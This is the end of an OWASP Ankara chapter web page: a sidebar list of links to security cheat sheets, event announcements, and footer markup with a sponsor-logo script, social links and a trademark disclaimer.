<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/REST_Security_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">REST Security 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Ruby_on_Rails_Cheatsheet.html">
<span style="font-size:smaller;text-decoration:none;">Ruby on Rails 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/SAML_Security_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">SAML Security 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">SQL Injection Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Securing Cascading Style Sheets 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Server Side Request Forgery Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Session_Management_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Session Management 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/TLS_Cipher_String_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">TLS Cipher String 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Third Party Javascript Management 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Threat_Modeling_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Threat Modeling 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Transaction_Authorization_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Transaction Authorization 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Transport Layer Protection 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Unvalidated Redirects and Forwards 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/User_Privacy_Protection_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">User Privacy Protection 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Virtual_Patching_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Virtual Patching 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Vulnerability Disclosure 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Vulnerable Dependency Management 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/Web_Service_Security_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">Web Service Security 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">
<span style="font-size:smaller;text-decoration:none;">XML External Entity Prevention 
</span></a></li>

<li><a href="https://github.com/pages/OWASP/www-chapter-ankara/cheatsheets/XML_Security_Cheat_Sheet.html">
<span style="font-size:normal;text-decoration:none;font-weight: bold;">XML Security 
</span></a></li>

</ul>

  
  
  

  <div class='owasp-sidebar-bottom'>
<h3>Upcoming Global Events</h3>
   <ul>
      <li><a href="https://appsecdays.org/?utm_source=owasp-web&utm_medium=right-col&utm_campaign=www-chapter-ankara" target="_blank" rel="noopener">Virtual AppSec Days, Summer</a></li>
      <li><a href="https://sf.globalappsec.org/?utm_source=owasp-web&utm_medium=right-col&utm_campaign=www-chapter-ankara" target="_blank" rel="noopener">Global AppSec SF October 19th-23rd</a></li>
     <li><a href="https://dublin.globalappsec.org/?utm_source=owasp-web&utm_medium=right-col&utm_campaign=www-chapter-ankara" target="_blank" rel="noopener">Global AppSec Dublin February 15-19th, 2021</a></li>
   </ul>
</div>


  <!--<div>
    <h3>OWASP News & Opinions</h3>
    <ul>
    	
    </ul>	
  </div>-->
</div>

      </div>
    </main>
    <footer>
  
  <section class="member">

  <script type="text/javascript">
    var members = [];
    $(function() {
      
      corp_members = YAML.load('https://owasp.org/assets/sitedata/corp_members.yml');
      $.each(corp_members, function (index) {
        members.push(this);
        });
        var randomIndexUsed = [];
        var counter = 0;
        var numberOfImages = 9;
        if(members.length > 0)
        {
          var htmlstring = "";
          while (counter < numberOfImages)
          {
              var randomIndex;
              var img;

              randomIndex = Math.floor(Math.random() * members.length);

              if (randomIndexUsed.indexOf(randomIndex) == "-1")
              {
                  counter++;
                  htmlstring += '<a href="'+ members[randomIndex]["url"] + '" class="member-logo" rel="sponsored noopener noreferrer" target="_blank" onclick="handleOutboundLinkClicks(event);"><img src="https://owasp.org' + members[randomIndex]["image"] + '" alt="image"/></a>';
                  
                  randomIndexUsed.push(randomIndex);
              }
          }

          $("#corp_member_div").html(htmlstring);
         
          var randi = Math.floor(Math.random() * members.length);
          htmlstring = '<h2>Spotlight: ' + members[randi]["name"] + '</h2>';
          htmlstring += '<a href="'+ members[randi]["url"] + '" rel="sponsored nopener noreferrer" target="_blank" onclick="handleOutboundLinkClicks(event);"><img src="https://owasp.org' + members[randi]["image"] + '" alt="image" /></a>';
          htmlstring += '<p>' + members[randi]["description"] + '</p>';
          $(".member-spotlight").html(htmlstring);
        }
    });
  </script>
  <div class="member-wrapper">
    <section class="member-spotlight">
    </section>
    <section class="member-list">
      <h2>Corporate Supporters</h2>
      <div id="corp_member_div">
      </div>
      <div class="member-cta">
        <a class="callout-link" href="/supporters">Become a corporate supporter</a>
      </div>
    </section>
  </div>
</section>

  
  <section class="footer-wrapper">
    <section class="social">
<a href="https://owasp-slack.herokuapp.com" aria-label="slack group" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-slack"></i></a>
<a href="https://www.facebook.com/OWASPFoundation" aria-label="facebook group" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-facebook-square"></i></a>
<a href="https://twitter.com/owasp" aria-label="twitter account" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-twitter"></i></a>
<a href="https://www.linkedin.com/company/owasp/" aria-label="linkedin account" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-linkedin"></i></a>
<a href="https://www.youtube.com/user/OWASPGLOBAL" aria-label="youtube account" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-youtube-square"></i></a>
</section>
    <nav class="bot-nav" role="navigation" aria-label="secondary navigation">
      <ul>
        <li><a href="/">HOME</a></li>
        <li><a href="/projects/">PROJECTS</a></li>
        <li><a href="/chapters/">CHAPTERS</a></li>
        <li><a href="/events/">EVENTS</a></li>
        <li><a href="/about/">ABOUT</a></li>
        <li><a href="/www-policy/operational/privacy">PRIVACY</a></li>
        <li><a href="/sitemap/">SITEMAP</a></li>
        <li><a href="/contact/">CONTACT</a></li>
      </ul>
    </nav>
    <p class="disclaimer">
        OWASP, Open Web Application Security Project, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, LASCON, and the OWASP logo are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our <a href="/www-policy/operational/general-disclaimer.html">General Disclaimer</a>. OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2020, OWASP Foundation, Inc.      
    </p>
  </section>
</footer>

  </body>
</html>


